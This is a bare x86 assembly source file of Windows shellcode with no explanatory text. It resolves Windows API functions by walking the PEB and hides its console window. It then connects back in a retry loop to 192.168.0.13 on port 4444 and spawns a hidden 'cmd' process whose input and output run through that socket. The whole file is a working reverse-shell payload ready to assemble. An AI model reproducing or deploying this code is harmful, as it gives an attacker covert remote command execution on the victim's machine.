global _s
section .text

_s:

xor ecx, ecx
mov eax, [fs:ecx+0x30]
mov eax, [eax+0xc]
mov esi, [eax+0x14]
lodsd
xchg eax, esi
lodsd
mov ebx, [eax+0x10]

mov edx, [ebx+0x3c]
add edx, ebx
mov edx, [edx+0x78]
add edx, ebx
mov esi, [edx+0x20]
add esi, ebx

J_Gp:
inc ecx

lodsd
add eax, ebx
cmp dword[eax], 0x43746547
jnz J_Gp
cmp dword[eax+0x4], 0x6f736e6f
jnz J_Gp
cmp dword[eax+0x8], 0x6957656c
jnz J_Gp
dec ecx

mov esi, [edx+0x24]
add esi, ebx
mov cx, [esi + ecx * 2]
mov esi, [edx+0x1c]
add esi, ebx
mov edx, [esi+ecx*4]
add edx, ebx

mov esi, edx ;GC

call esi

mov edi, eax

xor ecx, ecx
mov eax, [fs:ecx+0x30]
mov eax, [eax+0xc]
mov esi, [eax+0x14]
lodsd
xchg eax, esi
lodsd
mov ebx, [eax+0x10]

mov edx, [ebx+0x3c]
add edx, ebx
mov edx, [edx+0x78]
add edx, ebx
mov esi, [edx+0x20]
add esi, ebx

J_Pr:
inc ecx

lodsd
add eax, ebx
cmp dword[eax], 0x50746547
jnz J_Pr
cmp dword[eax+0x4], 0x41636f72
jnz J_Pr
cmp dword[eax+0x8], 0x65726464
jnz J_Pr
dec ecx

mov esi, [edx+0x24]
add esi, ebx
mov cx, [esi + ecx * 2]
mov esi, [edx+0x1c]
add esi, ebx
mov edx, [esi+ecx*4]
add edx, ebx

mov esi, edx ;GePro

xor ecx, ecx
push ecx
push 0x41797261
push 0x7262694c
push 0x64616f4c
push esp
push ebx

call esi

mov ebp, eax

xor ecx, ecx
mov cx, 0x3233
push ecx
push 0x72657375
push esp

call ebp

xor ecx, ecx
mov cx, 0x776f
push ecx
push 0x646e6957
push 0x776f6853
push esp
push eax

call esi

xor ecx, ecx
push ecx
push edi

call eax

xor ecx, ecx
push ecx
mov cx, 0x3233
push ecx
push 0x5f327377
push esp

call ebp

mov ebp, eax

xor ecx, ecx
push ecx
mov cx, 0x7075
push ecx
push 0x74726174
push 0x53415357
push esp
push ebp
call esi

xor ecx, ecx
mov cx, 0x0190
sub esp, ecx
push esp
push ecx

call eax

xor eax, eax
mov ax, 0x4174
push eax
push 0x656b636f
push 0x53415357
push esp
push ebp
call esi

xor ebx, ebx

push ebx
push ebx
push ebx
xor ecx, ecx
mov cl, 6
push ecx
inc ebx
push ebx
inc ebx
push ebx

call eax

xchg eax, edi
ec:
xor ebx, ebx
mov ebx, 0x74636565
shr ebx, 8
push ebx
push 0x6e6e6f63
push esp
push ebp

call esi

push 0x0d00a8c0
push word 0x5c11
xor ebx, ebx
add bl, 2
push word bx
mov edx, esp

push byte 16
push edx
push edi

call eax

xor ecx, ecx
cmp eax, ecx
jnz ec


xor ecx, ecx
mov eax, [fs:ecx+0x30]
mov eax, [eax+0xc]
mov esi, [eax+0x14]
lodsd
xchg eax, esi
lodsd
mov ebx, [eax+0x10]

mov edx, [ebx+0x3c]
add edx, ebx
mov edx, [edx+0x78]
add edx, ebx
mov esi, [edx+0x20]
add esi, ebx

P_Pr:
inc ecx

lodsd
add eax, ebx
cmp dword[eax], 0x61657243
jnz P_Pr
cmp dword[eax+0x4], 0x72506574
jnz P_Pr
cmp dword[eax+0x8], 0x7365636f
jnz P_Pr
dec ecx

mov esi, [edx+0x24]
add esi, ebx
mov cx, [esi + ecx * 2]
mov esi, [edx+0x1c]
add esi, ebx
mov edx, [esi+ecx*4]
add edx, ebx

mov esi, edx ;ProcAd

mov edx, 0x646d6363
shr edx, 8
push edx
mov ecx, esp

xor edx, edx

sub esp, 16
mov ebx, esp

push edi
push edi
push edi
push edx
push edx
xor eax, eax
inc eax
rol eax, 8
inc eax
push eax
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
push edx
xor eax, eax
add al, 44
push eax
mov eax, esp

push ebx
push eax
push edx
push edx
push 0x08000000
xor eax, eax
inc eax
push eax
push edx
push edx
push ecx
push edx

call esi

xor ecx, ecx
mov eax, [fs:ecx+0x30]
mov eax, [eax+0xc]
mov esi, [eax+0x14]
lodsd
xchg eax, esi
lodsd
mov ebx, [eax+0x10]

mov edx, [ebx+0x3c]
add edx, ebx
mov edx, [edx+0x78]
add edx, ebx
mov esi, [edx+0x20]
add esi, ebx

P_Ex:
inc ecx

lodsd
add eax, ebx
cmp dword[eax], 0x74697845
jnz P_Ex
cmp dword[eax+0x4], 0x6f725074
jnz P_Ex
cmp dword[eax+0x8], 0x73736563
jnz P_Ex
dec ecx

mov esi, [edx+0x24]
add esi, ebx
mov cx, [esi + ecx * 2]
mov esi, [edx+0x1c]
add esi, ebx
mov edx, [esi+ecx*4]
add edx, ebx

mov esi, edx ;ExtP

xor edx, edx
push edx
call esi
